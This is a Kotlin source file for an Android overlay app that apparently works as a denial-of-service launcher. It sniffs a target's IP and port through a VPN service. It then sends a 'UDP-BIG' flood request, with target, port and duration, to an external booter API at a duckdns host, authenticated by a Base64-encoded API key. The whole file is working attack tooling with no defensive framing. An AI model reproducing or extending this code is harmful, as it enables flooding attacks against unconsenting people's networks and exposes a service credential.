package com.teamjadugar.apk

import android.app.Service
import android.content.Intent
import android.graphics.PixelFormat
import android.net.VpnService
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Base64
import android.view.Gravity
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager
import android.widget.*
import java.net.HttpURLConnection
import java.net.URL

class FloatingService : Service() {
    private lateinit var windowManager: WindowManager
    private lateinit var floatingView: View
    private lateinit var etIp: EditText
    private lateinit var tvVpn: TextView
    private lateinit var tvTime: TextView
    private lateinit var btnAttack: Button
    private var selectedTime = 60

    companion object {
        var instance: FloatingService? = null
        var etIpRef: EditText? = null
        var tvVpnRef: TextView? = null

        fun onIpFound(fullIpPort: String) {
            Handler(Looper.getMainLooper()).post {
                etIpRef?.setText(fullIpPort)
                tvVpnRef?.text = "VPN: OFF (IP FOUND)"
                tvVpnRef?.setTextColor(android.graphics.Color.parseColor("#22C55E"))
                Toast.makeText(instance, "IP Caught: $fullIpPort", Toast.LENGTH_SHORT).show()
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.WRAP_CONTENT,
            WindowManager.LayoutParams.WRAP_CONTENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL, 
            PixelFormat.TRANSLUCENT
        )
        params.gravity = Gravity.TOP or Gravity.START
        params.x = 50
        params.y = 150

        floatingView = LayoutInflater.from(this).inflate(R.layout.floating_panel, null)
        windowManager.addView(floatingView, params)

        etIp = floatingView.findViewById(R.id.fEtIp)
        tvVpn = floatingView.findViewById(R.id.fTvVpnStatus)
        tvTime = floatingView.findViewById(R.id.fTvTime)
        btnAttack = floatingView.findViewById(R.id.fBtnAttack)
        
        etIpRef = etIp
        tvVpnRef = tvVpn

        val btnGetIp = floatingView.findViewById<Button>(R.id.fBtnGetIp)
        val seekBar = floatingView.findViewById<SeekBar>(R.id.fSeekBar)

        seekBar.setOnSeekBarChangeListener(object : SeekBar.OnSeekBarChangeListener {
            override fun onProgressChanged(seekBar: SeekBar?, progress: Int, fromUser: Boolean) {
                selectedTime = 60 + (progress * 10) 
                tvTime.text = "TIME: ${selectedTime}s"
            }
            override fun onStartTrackingTouch(seekBar: SeekBar?) {}
            override fun onStopTrackingTouch(seekBar: SeekBar?) {}
        })

        btnGetIp.setOnClickListener {
            tvVpn.text = "VPN: SNIFFING..."
            tvVpn.setTextColor(android.graphics.Color.parseColor("#F59E0B"))
            
            val intent = VpnService.prepare(this)
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
            } else {
                startService(Intent(this, VpnService::class.java))
            }
        }

        btnAttack.setOnClickListener {
            val ipPort = etIp.text.toString().trim()
            if (ipPort.isEmpty() || !ipPort.contains(":")) {
                Toast.makeText(this, "Please enter IP:PORT first!", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            btnAttack.text = "ATTACKING..."
            btnAttack.isEnabled = false
            
            fireDirectAttack(ipPort, selectedTime)
        }
    }

    private fun fireDirectAttack(ipPort: String, time: Int) {
        Thread {
            try {
                val parts = ipPort.split(":")
                val targetIp = parts[0]
                val targetPort = parts[1]

                val apiUrl = "https://specterapi.duckdns.org/api/v1/execute"
                
                // API Key (Encrypted)
                val decryptedApiKey = String(Base64.decode("c3BfbGl2ZV8wNjVhMzE4MDc4ZjNlZmMxOWUwYmU3MjAxMDJlOWE3ZQ==", Base64.DEFAULT))

                val url = URL(apiUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("x-api-key", decryptedApiKey)
                conn.doOutput = true

                val jsonInput = """{"target":"$targetIp","port":$targetPort,"duration":$time,"method":"UDP-BIG"}"""
                conn.outputStream.use { os -> os.write(jsonInput.toByteArray()) }

                val responseCode = conn.responseCode
                
                Handler(Looper.getMainLooper()).post {
                    if (responseCode == 200 || responseCode == 201) {
                        btnAttack.text = "ATTACK SENT!"
                        btnAttack.setBackgroundColor(android.graphics.Color.parseColor("#22C55E"))
                        Toast.makeText(this@FloatingService, "Attack Launched Successfully!", Toast.LENGTH_SHORT).show()
                    } else {
                        btnAttack.text = "🚀 START ATTACK"
                        btnAttack.isEnabled = true
                        Toast.makeText(this@FloatingService, "API Error: $responseCode", Toast.LENGTH_SHORT).show()
                    }
                }
            } catch (e: Exception) {
                Handler(Looper.getMainLooper()).post {
                    btnAttack.text = "🚀 START ATTACK"
                    btnAttack.isEnabled = true
                    Toast.makeText(this@FloatingService, "Network Error!", Toast.LENGTH_SHORT).show()
                }
            }
        }.start()
    }

    override fun onDestroy() {
        super.onDestroy()
        if (::floatingView.isInitialized) {
            windowManager.removeView(floatingView)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
